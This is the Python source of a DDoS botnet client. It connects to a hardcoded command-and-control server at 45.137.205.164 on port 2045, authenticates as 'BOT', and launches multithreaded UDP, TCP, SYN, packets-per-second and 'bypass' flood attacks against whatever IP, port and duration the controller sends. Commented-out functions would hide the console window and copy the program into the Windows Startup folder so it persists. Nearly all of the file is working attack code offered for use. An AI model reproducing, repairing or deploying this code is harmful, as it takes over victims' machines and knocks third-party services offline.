
import socket, threading, time, random, requests, os, subprocess
from os import urandom
from socket import IPPROTO_TCP

C2_ADDRESS  = "45.137.205.164"
C2_PORT     = 2045



#raw attacks





def attack_udp(ip, port, end_time, size):
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            dport = random.randint(1, 65535) if port == 0 else port
            while time.time() < end_time:
                data = os.urandom(size)
                s.sendto(data, (ip, dport))
        except Exception as e:
            continue
        finally:
            s.close()

def attack_tcp(ip, port, end_time, size):
    while time.time() < end_time:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            while time.time() < end_time:
                s.send(random._urandom(size))
        except:
            pass
        finally:
            s.close()



#layer 4 normal attacks



def attack_udp_gbps(ip, port, end_time, size):
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            dport = random.randint(1, 65535) if port == 0 else port
            while time.time() < end_time:
                data = os.urandom(size)
                s.sendto(data, (ip, dport))
                s.sendto(data, (ip, dport))
                s.sendto(data, (ip, dport))
        except Exception as e:
            continue
        finally:
            s.close()




def attack_tcp_syn(ip, port, end_time, size):
    while time.time() < end_time:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, IPPROTO_TCP)
        try:
            s.connect((ip, port))
            while time.time() < end_time:
                s.send(s, urandom(size))
        except:
            pass
        finally:
            s.close()


def attack_pps(ip, port, end_time, size):
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            dport = random.randint(1, 65535) if port == 0 else port
            data = b' ' * 64 
            while time.time() < end_time:
                s.sendto(data, (ip, dport))
        except Exception as e:
            continue
        finally:
            s.close()



#bypass attacks


def generate_random_payload(size):
    return bytes(random.getrandbits(8) for _ in range(size))

def attack_udp_bypass(ip, port, end_time, size):
    max_packets = 1950
    
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            dport = random.randint(1, 65535) if port == 0 else port
            packets_sent = 0
            while time.time() < end_time and packets_sent < max_packets:
                data = generate_random_payload(size)
                s.sendto(data, (ip, dport))
                packets_sent += 1
        except Exception as e:
            continue
        finally:
            s.close()



def attack_tcp_bypass(ip, port, end_time, size):
    max_packets = 1950

    while time.time() < end_time:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            packets_sent = 0
            while time.time() < end_time and packets_sent < max_packets:
                data = generate_random_payload(size)
                s.sendto(data, (ip, port))
                packets_sent += 1
        except:
            pass
        finally:
            s.close()









# other attacks



    








def main():
        c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        while 1:
            try:
                c2.connect((C2_ADDRESS, C2_PORT))
                while 1:
                    c2.send('669787761736865726500'.encode())
                    break
                while 1:
                    time.sleep(1)
                    data = c2.recv(1024).decode()
                    if 'Username' in data:
                        c2.send('BOT'.encode())
                        break
                while 1:
                    time.sleep(1)
                    data = c2.recv(1024).decode()
                    if 'Password' in data:
                        c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                        break
                break
            except:
                time.sleep(5)
        while 1:
            try:
                data = c2.recv(1024).decode().strip()
                if not data:
                    break
                args = data.split(' ')
                command = args[0].upper()

                if command == '!UDP-RAW':
                    ip = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    end_time = time.time() + duration
                    size = 65500
                    threads = 20

                    for _ in range(threads):
                        threading.Thread(target=attack_udp, args=(ip, port, end_time, size), daemon=True).start()
                if command == '!TCP-RAW':
                    ip = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    end_time = time.time() + duration
                    size = 65500
                    threads = 20

                    for _ in range(threads):
                        threading.Thread(target=attack_tcp, args=(ip, port, end_time, size), daemon=True).start()
                if command == '!UDP-BYPASS':
                    ip = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    end_time = time.time() + duration
                    size = 1400
                    threads = 20

                    for _ in range(threads):
                        threading.Thread(target=attack_udp_bypass, args=(ip, port, end_time, size), daemon=True).start()
                if command == '!TCP-BYPASS':
                    ip = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    end_time = time.time() + duration
                    size = 1400
                    threads = 20

                    for _ in range(threads):
                        threading.Thread(target=attack_tcp_bypass, args=(ip, port, end_time, size), daemon=True).start()
                if command == '!UDP-GBPS':
                    ip = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    end_time = time.time() + duration
                    size = 65500
                    threads = 20
                    for _ in range(threads):
                        threading.Thread(target=attack_udp_gbps, args=(ip, port, end_time, size), daemon=True).start()
                if command == '!TCP-SYN':
                    ip = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    end_time = time.time() + duration
                    size = 65500
                    threads = 20
                    for _ in range(threads):
                        threading.Thread(target=attack_tcp_syn, args=(ip, port, end_time, size), daemon=True).start()
                if command == '!PPS-RAW':
                    ip = args[1]
                    port = int(args[2])
                    duration = int(args[3])
                    end_time = time.time() + duration
                    size = 65500
                    threads = 20
                    for _ in range(threads):
                        threading.Thread(target=attack_pps, args=(ip, port, end_time, size), daemon=True).start()

                        
                elif command == 'PING':
                    c2.send('PONG'.encode())
            except:
                break
        c2.close()

        main()

#def get_executable_path():
   # return os.path.abspath(sys.argv[0])

#def hide_cmd_and_run_exe(exe_path):
  #  startupinfo = subprocess.STARTUPINFO()
  #  startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
  #  subprocess.Popen(exe_path, startupinfo=startupinfo, creationflags=subprocess.CREATE_NO_WINDOW)

#def copy_self_to_startup():
   # script_or_exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
   # script_or_exe_dir = os.path.dirname(os.path.abspath(script_or_exe_path))
   # script_or_exe_name = os.path.basename(script_or_exe_path)
   # startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
   # if not script_in_startup:
       # shutil.copy(os.path.join(script_or_exe_dir, script_or_exe_name), os.path.join(startup_folder, script_or_exe_name))

def check_internet_connection():
    try:
        requests.get("http://www.google.com", timeout=5)
        return True
    except requests.ConnectionError:
        return False

if __name__ == '__main__':
    while True:
        if check_internet_connection():
            #copy_self_to_startup()
            #exe_path = get_executable_path()
            main()
        else:
            time.sleep(5)
